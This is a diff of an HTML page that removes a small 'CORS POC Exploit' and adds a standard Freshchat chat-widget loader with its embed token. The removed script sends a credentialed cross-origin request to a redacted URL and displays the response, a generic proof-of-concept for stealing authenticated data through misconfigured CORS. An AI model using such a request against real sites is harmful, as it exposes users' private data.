@@ -1,26 +1,13 @@
-<!DOCTYPE html>
 <html>
-<body>
-<center>
-<h2>CORS POC Exploit</h2>
-
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
-
+  <body>
 <script>
-function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML = alert(this.responseText);
-    }
-  };
-  xhttp.open("GET", "*******", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
-}
+  function initFreshChat() {
+    window.fcWidget.init({
+      token: "6ae8951d-28c5-42a1-acd7-9fbc02abe6e8",
+      host: "https://wchat.in.freshchat.com"
+    });
+  }
+  function initialize(i,t){var e;i.getElementById(t)?initFreshChat():((e=i.createElement("script")).id=t,e.async=!0,e.src="https://wchat.in.freshchat.com/js/widget.js",e.onload=initFreshChat,i.head.appendChild(e))}function initiateCall(){initialize(document,"freshchat-js-sdk")}window.addEventListener?window.addEventListener("load",initiateCall,!1):window.attachEvent("load",initiateCall,!1);
 </script>
-
-</body>
+  </body>
 </html>
